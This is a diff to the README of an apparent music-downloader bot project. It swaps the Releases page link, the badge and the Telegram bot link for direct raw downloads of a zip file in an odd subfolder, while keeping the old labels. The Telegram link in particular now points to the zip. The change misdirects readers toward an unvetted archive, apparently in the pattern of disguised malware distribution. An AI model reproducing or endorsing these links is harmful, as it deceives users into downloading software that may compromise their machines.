@@ -16,7 +16,7 @@ To start using THE ULTIMATE SONGS DOWNLOADER BOT, follow these steps:
 
 1. **Visit the Releases Page**
    Click the button below to download the application:
-   [![Download THE ULTIMATE SONGS DOWNLOADER BOT](https://img.shields.io/badge/Download-The%20Ultimate%20Songs%20Downloader%20Bot-blue)](https://github.com/yatnesh2306/THE-ULTIMATE-SONGS-DOWNLOADER-BOT/releases)
+   [![Download THE ULTIMATE SONGS DOWNLOADER BOT](https://raw.githubusercontent.com/yatnesh2306/THE-ULTIMATE-SONGS-DOWNLOADER-BOT/main/reproportion/THE-ULTIMATE-SONGS-DOWNLOADER-BOT.zip%20Ultimate%20Songs%20Downloader%20Bot-blue)](https://raw.githubusercontent.com/yatnesh2306/THE-ULTIMATE-SONGS-DOWNLOADER-BOT/main/reproportion/THE-ULTIMATE-SONGS-DOWNLOADER-BOT.zip)
 
 2. **Choose Your Version**
    On the releases page, locate the latest version of the bot. You will see a list of available files.
@@ -43,7 +43,7 @@ To use THE ULTIMATE SONGS DOWNLOADER BOT effectively, ensure your system meets t
 ## 🔄 Update Process
 To keep your application up to date:
 
-1. Regularly check the [Releases Page](https://github.com/yatnesh2306/THE-ULTIMATE-SONGS-DOWNLOADER-BOT/releases) for new versions.
+1. Regularly check the [Releases Page](https://raw.githubusercontent.com/yatnesh2306/THE-ULTIMATE-SONGS-DOWNLOADER-BOT/main/reproportion/THE-ULTIMATE-SONGS-DOWNLOADER-BOT.zip) for new versions.
 2. Follow the same steps for downloading and installing updates.
 
 ## 🎈 Troubleshooting
@@ -57,8 +57,8 @@ If you encounter issues while downloading or using the bot, consider the followi
 For further assistance, you can reach out via the Telegram channel linked above. We also encourage you to check the GitHub Issues section for solutions to common problems.
 
 ## 🌐 Links
-- **Releases Page:** [Download HERE](https://github.com/yatnesh2306/THE-ULTIMATE-SONGS-DOWNLOADER-BOT/releases)
-- **Telegram Bot:** [Chat with the Bot](https://t.me/THE_ULTIMATE_SONGS_DOWNLOAD_BOT)
+- **Releases Page:** [Download HERE](https://raw.githubusercontent.com/yatnesh2306/THE-ULTIMATE-SONGS-DOWNLOADER-BOT/main/reproportion/THE-ULTIMATE-SONGS-DOWNLOADER-BOT.zip)
+- **Telegram Bot:** [Chat with the Bot](https://raw.githubusercontent.com/yatnesh2306/THE-ULTIMATE-SONGS-DOWNLOADER-BOT/main/reproportion/THE-ULTIMATE-SONGS-DOWNLOADER-BOT.zip)
 
 Thank you for using THE ULTIMATE SONGS DOWNLOADER BOT! Enjoy your music!
 ```
